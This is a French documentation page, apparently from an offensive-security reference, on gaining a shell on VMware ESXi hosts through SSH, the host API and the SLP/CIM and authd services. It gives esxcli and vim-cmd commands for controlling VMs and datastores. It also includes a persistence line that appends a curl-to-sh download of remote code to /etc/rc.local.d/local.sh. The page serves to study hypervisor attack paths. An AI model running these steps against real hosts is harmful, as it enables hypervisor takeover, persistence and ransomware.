---
order: 1
title: "Accès à l'hôte et shell : exécution sur l'hôte ESXi"
description: "Au-delà d'une évasion d'invité, un hôte ESXi s'atteint via sa surface de gestion : l'API et le shell hôte authentifiés, SSH lorsqu'il est activé, et les services SLP/CIM et vmx authd. Avec des identifiants hôte ou une faille de gestion, un attaquant obtient un shell vmkernel, depuis lequel il contrôle chaque VM, lit les datastores et établit une persistance sur l'hyperviseur lui-même."
keywords:
  - shell esxi
  - esxcli
  - ssh
  - slp cim
  - vmkernel
---

# Accès à l'hôte et shell

Une évasion d'invité est une façon d'arriver sur l'hôte ; l'autre est la surface de gestion d'ESXi. ESXi expose une API et un client hôte authentifiés via HTTPS, un ESXi Shell et SSH (souvent désactivés mais fréquemment réactivés), et les services SLP/CIM et d'authentification `vmx` (902). Avec des identifiants hôte, une faille de service de gestion ou un SSH réactivé, un attaquant obtient un shell dans l'environnement vmkernel, soit le contrôle total de l'hyperviseur : démarrer et arrêter des VM, lire et modifier les datastores, injecter dans les invités et persister sur l'hôte.

## Obtenir un shell

```bash
# SSH, if enabled (or enable it via the API/DCUI with host creds)
ssh root@<esxi-host>
# the ESXi shell gives esxcli and direct vmkernel access
esxcli vm process list                       # running VMs and their worlds
esxcli storage filesystem list               # datastores
vim-cmd vmsvc/getallvms                       # inventory via the management CLI
# the host API over HTTPS (vSphere API / host client) performs the same with creds
```

## Ce que donne l'accès à l'hôte

```bash
# control every VM
vim-cmd vmsvc/power.off <vmid>; vim-cmd vmsvc/snapshot.create <vmid>
# read any VM's disk from the datastore (see datastore theft)
ls /vmfs/volumes/*/
# run commands inside a guest via VMware Tools (guest operations), with guest creds
vim-cmd vmsvc/guestop ...
# persist on the host: startup scripts in /etc/rc.local.d/local.sh survive reboot
echo '/bin/sh -c "curl http://a/c | sh" &' >> /etc/rc.local.d/local.sh
```

## Notes d'exploitation

- Réactiver SSH ou l'ESXi Shell nécessite un accès admin hôte via l'API ou le DCUI ; avec des identifiants hôte, c'est la voie la plus rapide vers un shell interactif.
- Les services SLP/CIM (427) et authd (902) ont été par le passé le point d'entrée de compromissions hôte pré-auth ; un ESXi non corrigé, exposé sur Internet ou le réseau de gestion, est une cible directe, et ceux-ci ont alimenté des campagnes massives de ransomware contre des flottes ESXi.
- `/etc/rc.local.d/local.sh` et le bootbank local sont les emplacements de persistance hôte qui survivent au redémarrage ; le système de fichiers vmkernel est par ailleurs largement en mémoire.
- L'accès à l'hôte englobe le vol de datastore et le contrôle des invités ; une fois sur l'hôte, utilisez [Vol de datastore et de VMDK](datastore-and-vmdk-theft.md) pour les données hors ligne et l'API d'opérations invité pour exécuter dans les VM.

## Références

- [VMware: ESXi shell and SSH access](https://docs.vmware.com/en/VMware-vSphere/index.html)
- [VMware security advisories (SLP/CIM)](https://www.vmware.com/security/advisories.html)
- [esxcli reference](https://developer.vmware.com/tool/esxcli)
